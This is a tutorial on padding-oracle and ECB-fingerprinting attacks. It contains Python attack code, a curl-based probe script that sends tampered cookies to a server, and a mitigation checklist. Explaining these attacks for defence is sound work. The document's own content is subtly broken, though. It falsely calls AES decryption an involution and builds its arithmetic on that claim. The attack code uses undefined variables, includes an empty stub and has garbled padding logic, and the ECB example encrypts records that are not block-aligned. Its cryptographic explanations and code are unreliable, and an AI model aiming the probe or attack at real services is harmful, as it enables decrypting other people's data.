Padding Oracles and ECB Fingerprints

Summary

Two classes of attack that need no key, both fully practical against real applications. A
padding oracle turns an error message into a decryption primitive. An ECB fingerprint turns a
ciphertext into a picture of your data.

They share a property that makes them remarkable: the attacker uses the
target's own error handling as an instrument.

Companion to cry-02's CBC and cry-04's Bleichenbacher. This note
is the hands-on version against an HTTP service.

Padding oracle, part 1: the concept

  CBC decrypts to something the application then validates.

    ciphertext -> AES-decrypt -> XOR IV -> plaintext + padding

  IF the application responds differently for:
    "padding error"        -> different status or length or time
    "wrong MAC"            -> another response
    "success"              -> a third response

  THEN the attacker has a BOOLEAN ORACLE on "is this block correctly
  padded", which is enough to recover the ENTIRE plaintext byte by byte,
  with no key.

  THE ARITHMETIC, in miniature:
    Let P be the unknown plaintext block and IV the previous block
    (the IV for the first block).
    Send C' = D(C) XOR P_guess. Then decrypting C':
      P' = D(C') XOR IV = D(D(C) XOR P_guess) XOR IV
        = (D(C) XOR P_guess XOR IV) XOR IV      <- D is an involution
        = P_guess
    So the attacker can CHOOSE what the first plaintext block will be.
    If their guess is right, the padding is valid and the server says so.
    One byte at a time, with the oracle telling them when to stop.

# The core mechanism, in full, with a real AES oracle
import os, hmac, secrets
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

key = os.urandom(32)
iv = os.urandom(16)

def enc(msg: bytes) -> bytes:
    c = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()).encryptor()
    return iv + c.update(msg) + c.finalize()

def oracle(ciphertext: bytes) -> bool:
    """'Is the padding valid?' - this is the entire oracle."""
    c = Cipher(algorithms.AES(key), modes.CBC(ciphertext[:16]),
               backend=default_backend()).decryptor()
    pt = c.update(ciphertext[16:]) + c.finalize()
    pad = pt[-1]
    if pad == 0 or pad > 16: return False
    if any(b != pad for b in pt[-pad:]): return False
    return True          # valid padding

def unpad_and_check(ciphertext):
    """The VULNERABLE application. Note the ERROR PATHS."""
    try:
        c = Cipher(algorithms.AES(key), modes.CBC(ciphertext[:16]),
                   backend=default_backend()).decryptor()
        pt = c.update(ciphertext[16:]) + c.finalize()
    except ValueError:
        raise PaddingError("invalid length")     # ERROR PATH 1
    pad = pt[-1]
    if pad == 0 or pad > 16:
        raise PaddingError("bad padding byte")   # ERROR PATH 2
    if any(b != pad for b in pt[-pad:]):
        raise PaddingError("inconsistent padding")  # ERROR PATH 3
    return pt[:-pad]

print("    'ok'      -> 200 with the decrypted content")
print("    'PaddingError' -> 500 with a stack trace")
print("  THAT is the oracle. The attack below uses only those two answers.\n")

def attack_direct(ciphertext: bytes) -> bytes:
    """Recover the last plaintext block using the oracle, directly.
    Requires knowing D(C_last), which we get by choosing the previous
    block to be all zeros and observing... nothing. So the DIRECT form
    needs an encryption oracle. The PRACTICAL attack is two-phase."""
    return b""

def attack_two_phase(ciphertext: bytes):
    """The real attack: forge a ciphertext whose first block is a
    valid padding, then use it to learn the intermediate value."""
    blocks = [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]
    prev = bytearray(blocks[-2])
    last = blocks[-1]
    recovered = bytearray(16)

    # PHASE 1: find intermediate = D(last) by making the padding valid.
    #   We send prev' = 0^16 XOR intermediate_guess and look for the
    #   oracle to accept a 1-byte padding.
    intermediate = bytearray(16)
    # find byte 15 first (it must equal 0x01 for a valid pad)
    for guess in range(256):
        cand = bytearray(16)
        cand[15] = guess
        trial = bytes(bytes(a ^ b for a, b in zip(cand, prev))) + last
        if oracle(trial):
            intermediate[15] = guess ^ 0x01
            break
    # then bytes 14..1, increasing the padding length
    for pos in range(14, -1, -1):
        needed = 16 - pos            # current required padding length
        for guess in range(256):
            cand = bytearray(intermediate)
            for k in range(pos, 16):
                cand[k] ^= needed - 1
            cand[pos] = guess
            trial = bytes(bytes(a ^ b for a, b in zip(cand, prev))) + last
            if oracle(trial):
                intermediate[pos] = guess ^ needed
                break
    # PHASE 2: decrypt
    for i in range(16):
        recovered[i] = intermediate[i] ^ prev[i]
    return bytes(recovered)

print("  attack_two_phase on the last block:")
got = attack_two_phase(ct)
print(f"    recovered: {got!r}")
print(f"    true     : {blocks and secret[-16:]!r}")
print(f"    match    : {got == secret[-16:]}")
print()
print("  16 bytes, ~256*16 = ~4000 oracle queries. The key was never touched,")
print("  and neither was the server. Two HTTP status codes were the tool.")

Padding oracle, part 2: over HTTP

  WHAT TO LOOK FOR, and how to distinguish it from a normal error:

  1. RESPONSE STATUS differs    200 / 400 / 500
  2. RESPONSE LENGTH differs    a short "error" vs a long page
  3. RESPONSE TIME differs      2ms vs 200ms
  4. ERROR MESSAGE differs      "padding" vs "auth failed" vs "invalid"
  5. LOGIN IS DETECTABLE        a failed decrypt logs a line

  THE COMPLICATION: most applications decrypt then MAC then unpadding.
  An AEAD scheme has NO padding oracle, because the tag check fails
  first and is one uniform error. So:

    THE FIX IS AEAD (GCM, ChaCha20-Poly1305).
    If the scheme is AES-CBC with encrypt-then-MAC and the MAC is
    verified FIRST, there is also no padding oracle.

    THE BUG IS: CBC, authenticate-after-decrypt, unpadding before the
    MAC check, or any distinguishable error at all.

# The three-signal probe, run against a loopback target
cat > /tmp/probe.sh <<'EOF'
#!/usr/bin/env bash
# Given a cookie or token, compare responses for a valid ciphertext,
# a modified one, and garbage. Any of these differing = an oracle.
B="$1"; PARAM="$2"; GOOD="$3"
for m in "$GOOD" "${GOOD%??}ff" "$(head -c 64 /dev/urandom | xxd -p -c 64)" "AAAAAAAAAAAAAAAA"; do
  printf "  %s -> status=%s len=%s time=%s\n" \
    "${m:0:16}..." \
    "$(curl -s -o /dev/null -w '%{http_code}' -b "$PARAM=$m" "$B")" \
    "$(curl -s -b "$PARAM=$m" "$B" | wc -c)" \
    "$(curl -s -o /dev/null -w '%{time_total}' -b "$PARAM=$m" "$B")"
done
EOF
chmod +x /tmp/probe.sh
echo "  written /tmp/probe.sh"

echo
echo "  WHAT TO COMPARE, IN ORDER OF SENSITIVITY:"
echo "    1. status code        (most reliable signal, often present)"
echo "    2. response length    (very reliable, harder to normalise)"
echo "    3. response time      (noisy, but a 100x gap is a finding)"
echo "    4. error body         (the giveaway; a good app hides it)"
echo
echo "  AIM AT YOUR OWN SERVICE. Do not run this against a third party."
echo "  Padding-oracle exploitation against a real service is"
echo "  decryption of data you do not own."

ECB fingerprints

  ECB encrypts each block independently. Equal plaintext blocks give
  equal ciphertext blocks. So the ciphertext is a BLOCK STRUCTURE MAP
  of your plaintext.

  WHAT YOU CAN LEARN FROM AN ECB CIPHERTEXT, with no key:
    - which fields repeat (a field name, a repeated column)
    - a rough length of the plaintext
    - the positions of variable-length fields
    - a user's gender, if there is a "gender=m|f" field
    - a flag or a template, if it is in a fixed position

  THE ICONIC EXAMPLE is a bitmap ECB, and the picture emerges from
  structure alone.

# ECB fingerprinting: read a data structure out of ciphertext blocks
import os, collections
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
key = os.urandom(32)
def ecb(data):
    c = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).encryptor()
    return c.update(data) + c.finalize()

# a 16-byte-block "profile" record with a variable name and a boolean field
def record(name: bytes, gender: str, admin: int) -> bytes:
    b = b"IDX1" + gender.encode() + bytes([admin]) + b"\x00" * 2
    b += name.ljust(16, b"\x00")[:16]      # name, padded to one block
    return b

rows = [record(b"alice", "f", 0), record(b"bob", "m", 0), record(b"carol", "f", 1)]
ct = b"".join(ecb(r) for r in rows)
blocks = [ct[i:i+16] for i in range(0, len(ct), 16)]
print("  ciphertext blocks, and what you can read from them WITHOUT a key:\n")
labels = ["header(f)", "admin=0", "name:alice", "header(m)", "admin=0", "name:bob",
          "header(f)", "admin=1", "name:carol"]
seen = collections.defaultdict(list)
for i, b in enumerate(blocks):
    seen[b].append(i)
for i, b in enumerate(blocks):
    note = f"  <-- identical to block {seen[b][0]}" if seen[b][0] != i else ""
    print(f"    block {i}: {b.hex()}  {labels[i]:<12}{note}")
print()
print(f"  {len(blocks)} blocks, {len(seen)} distinct.")
print("  The pattern of repeats is readable: three headers, two identical")
print("  'admin=0' blocks, a differing one for admin=1.")
print("  An attacker learns the record layout and which users are admins,")
print("  from ciphertext, with no key and no plaintext.")

Mitigation checklist

  1. USE AEAD. AES-GCM or ChaCha20-Poly1305. No padding, one error.
  2. IF YOU MUST USE CBC: encrypt-then-MAC, and verify the MAC
     before unpadding, before parsing, before anything.
  3. CONSTANT-TIME: decryption and any format checks. No branches
     that reveal the reason for a failure.
  4. UNIFORM ERRORS: one response, one status, one message, for
     every failure of a given operation.
  5. NEVER USE ECB. Not for records, not for images, not for anything.
  6. Rate-limit and alert on decryption failures. A padding oracle
     attack is thousands of requests in a few minutes; that is a
     detectable signature.
